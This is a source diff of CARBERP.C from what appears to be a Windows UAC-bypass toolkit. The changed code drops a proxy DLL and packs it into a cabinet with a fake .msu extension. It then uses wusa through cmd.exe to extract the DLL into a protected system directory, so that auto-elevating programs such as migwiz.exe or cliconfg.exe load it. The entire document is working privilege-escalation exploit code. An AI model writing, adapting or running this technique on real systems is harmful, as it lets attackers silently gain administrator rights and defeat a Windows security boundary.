@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     1.50
+*  VERSION:     1.60
 *
-*  DATE:        05 Apr 2015
+*  DATE:        20 Apr 2015
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -18,56 +18,31 @@
 *
 *******************************************************************************/
 #include "global.h"
+#include "makecab.h"
 
 /*
-* ucmWusaCopyFile
+* ucmWusaExtractPackage
 *
 * Purpose:
 *
-* Copy file to protected directory using wusa.
+* Extract cab to protected directory using wusa.
 *
 */
-BOOL ucmWusaCopyFile(
-	LPWSTR lpSourceDll,
-	LPWSTR lpMsuPackage,
-	LPWSTR lpCommandLine,
-	PVOID FileBuffer,
-	DWORD FileBufferSize
+BOOL ucmWusaExtractPackage(
+	LPWSTR lpCommandLine
 	)
 {
 	BOOL bResult = FALSE, cond = FALSE;
-	WCHAR szDllFileName[MAX_PATH + 1];
 	WCHAR szMsuFileName[MAX_PATH + 1];
 	WCHAR szCmd[MAX_PATH * 4];
 
-	RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
 	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
 
 	do {
 
-		if (ExpandEnvironmentStringsW(lpSourceDll,
-			szDllFileName, MAX_PATH) == 0)
-		{
-			break;
-		}
-
-		if (ExpandEnvironmentStringsW(lpMsuPackage,
+		if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
 			szMsuFileName, MAX_PATH) == 0)
 		{
-			break;
-		}
-
-		//drop proxy dll
-		if (!supWriteBufferToFile(szDllFileName, FileBuffer, FileBufferSize)) {
-			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
-			break;
-		}
-
-		//create cab with msu extension
-		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-		wsprintfW(szCmd, L" /V1 %ws %ws", szDllFileName, szMsuFileName);
-		if (!supRunProcess(L"makecab.exe", szCmd)) {
-			OutputDebugString(TEXT("[UCM] Makecab failed"));
 			break;
 		}
 
@@ -76,16 +51,12 @@ BOOL ucmWusaCopyFile(
 		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
 		bResult = supRunProcess(L"cmd.exe", szCmd);
 		if (bResult == FALSE) {
-			OutputDebugString(TEXT("[UCM] Wusa copy file failed"));
+			OutputDebugString(TEXT("[UCM] Wusa extract files failed"));
 			break;
 		}
 
 	} while (cond);
 
-	//cleanup
-	if (szDllFileName[0] != 0) {
-		DeleteFileW(szDllFileName);
-	}
 	if (szMsuFileName[0] != 0) {
 		DeleteFileW(szMsuFileName);
 	}
@@ -107,7 +78,7 @@ BOOL ucmWusaMethod(
 	)
 {
 	BOOL bResult = FALSE, cond = FALSE;
-	LPWSTR lpSourceDll, lpMsuPackage, lpCommandLine, lpTargetProcess;
+	LPWSTR lpSourceDll, lpCommandLine, lpTargetProcess;
 	WCHAR szCmd[MAX_PATH * 4];
 
 	if (
@@ -123,17 +94,15 @@ BOOL ucmWusaMethod(
 	//use migwiz.exe as target
 	case METHOD_CARBERP:
 		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
-		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
 		lpCommandLine = METHOD_MIGWIZ_CMDLINE;
 		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
 		break;
 
 	//use cliconfg.exe as target
 	case METHOD_CARBERP_EX:
-		lpSourceDll = METHOD_SQLSVR_SOURCEDLL;
-		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
-		lpCommandLine = METHOD_SQLSVR_CMDLINE;
-		lpTargetProcess = METHOD_SQLSVR_TARGETAPP;
+		lpSourceDll = METHOD_SQLSRV_SOURCEDLL;
+		lpCommandLine = METHOD_SQLSRV_CMDLINE;
+		lpTargetProcess = METHOD_SQLSRV_TARGETAPP;
 		break;
 
 	default:
@@ -142,10 +111,15 @@ BOOL ucmWusaMethod(
 
 	do {
 
-		//copy file to the protected directory
-		if (!ucmWusaCopyFile(lpSourceDll, lpMsuPackage, 
-			lpCommandLine, ProxyDll, ProxyDllSize))
-		{
+		//
+		// Extract file to the protected directory
+		// First, create cab with fake msu ext, second run fusion process.
+		//
+		if (!ucmCreateCabinetForSingleFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
+			break;
+		}
+
+		if (!ucmWusaExtractPackage(lpCommandLine)) {
 			break;
 		}
 
@@ -160,6 +134,71 @@ BOOL ucmWusaMethod(
 
 	} while (cond);
 
+
+	return bResult;
+}
+
+/*
+* ucmCreateCabinetForSingleFile
+*
+* Purpose:
+*
+* Build cabinet for usage in methods where required 1 file.
+*
+*/
+BOOL ucmCreateCabinetForSingleFile(
+	LPWSTR lpSourceDll,
+	PVOID ProxyDll,
+	DWORD ProxyDllSize
+	)
+{
+	BOOL cond = FALSE, bResult = FALSE;
+	CABDATA *Cabinet = NULL;
+	WCHAR szDllFileName[MAX_PATH + 1];
+	WCHAR szMsuFileName[MAX_PATH + 1];
+
+	if (
+		(ProxyDll == NULL) ||
+		(ProxyDllSize == 0)
+		)
+	{
+		return FALSE;
+	}
+
+	do {
+
+		//drop proxy dll
+		RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
+		if (ExpandEnvironmentStringsW(lpSourceDll,
+			szDllFileName, MAX_PATH) == 0)
+		{
+			break;
+		}
+		if (!supWriteBufferToFile(szDllFileName, ProxyDll, ProxyDllSize)) {
+			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
+			break;
+		}
+
+		//build cabinet
+		RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
+		if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
+			szMsuFileName, MAX_PATH) == 0)
+		{
+			break;
+		}
+		Cabinet = cabCreate(szMsuFileName);
+		if (Cabinet) {
+			lpSourceDll = _filenameW(szDllFileName);
+			//put file without compression
+			bResult = cabAddFile(Cabinet, szDllFileName, lpSourceDll);
+			cabClose(Cabinet);
+		}
+		else {
+			OutputDebugString(TEXT("[UCM] Error creating cab archive"));
+			break;
+		}
+
+	} while (cond);
 
 	return bResult;
 }
